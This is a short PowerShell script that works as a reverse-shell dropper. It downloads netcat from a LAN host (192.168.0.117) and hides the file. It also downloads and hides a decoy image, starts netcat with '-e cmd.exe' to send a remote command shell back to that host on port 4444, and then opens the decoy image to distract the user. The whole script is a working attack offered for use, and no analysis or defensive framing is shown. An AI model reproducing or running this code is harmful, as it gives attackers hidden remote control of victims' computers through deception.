# Set URLs and paths
$url = "http://192.168.0.117/nc.exe"
$desktopPath = [System.Environment+SpecialFolder]::Desktop
$filename = "nc.exe"
$finalPath = Join-Path -Path $desktopPath -ChildPath $filename

$url2 = "https://yt3.ggpht.com/..."  # Replace with real decoy image URL
$filename2 = "handsome01.jpg"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2

# Download Netcat and hide it
Invoke-WebRequest -Uri $url -OutFile $finalPath
Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Download decoy image and hide it
Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Define Netcat reverse shell arguments
$params = "-d 192.168.0.117 4444 -e cmd.exe"

# Execute Netcat reverse shell
Start-Process -FilePath $finalPath -ArgumentList $params

# Open the decoy image to distract the user
Start-Process $finalPath2
